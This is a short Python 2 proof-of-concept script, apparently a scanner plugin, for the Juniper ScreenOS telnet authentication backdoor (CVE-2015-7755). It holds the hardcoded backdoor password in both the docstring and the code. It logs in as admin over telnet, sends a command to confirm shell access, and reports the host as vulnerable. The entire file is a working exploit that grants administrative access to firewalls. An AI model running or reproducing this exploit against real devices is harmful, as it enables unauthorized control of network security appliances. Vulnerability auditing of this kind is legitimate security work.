#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urlparse
import time
import telnetlib

"""

<<< %s(un='%s') = %u 后门密码


POC Name  : Juniper NetScreenOS NetScreen telnet backdoo
Author    :  a
mail      :  a@lcx.cc
regfer    : https://community.rapid7.com/community/infosec/blog/2015/12/20/cve-2015-7755-juniper-screenos-authentication-backdoor
"""

def assign(service, arg):
    if service == 'ip':
        arr = urlparse.urlparse(arg)
        return True, arg

def audit(arg):
    port = 23
    time = 5
    user = 'admin'
    password = '<<< %s(un=\'%s\') = %u'
    finish = '->'
    try:
        t = telnetlib.Telnet(arg,port, timeout=time)
        t.write(user + '\n')
        t.read_until('password: ')  
        t.write(password + '\n')
        str1 =  t.read_until(finish)
        t.write("?\n")
        str = t.read_until(finish)
        t.close()
        if ('->' in str) and ('exec' in str):
            security_hole(arg)
    except Exception, e:
        pass